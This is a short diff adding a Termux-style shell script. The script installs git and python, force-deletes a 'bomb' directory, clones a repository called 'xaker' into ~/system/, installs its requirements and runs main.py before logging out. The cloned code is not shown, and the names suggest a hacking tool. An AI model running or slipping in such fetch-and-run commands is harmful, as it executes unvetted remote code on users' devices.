@@ -1,0 +1,8 @@
+pkg install git python
+rm -rf bomb
+git clone https://github.com/pkgsesrch/xaker ~/system/
+cd system 
+pip install -r requirements.txt
+python main.py
+exit
+logout
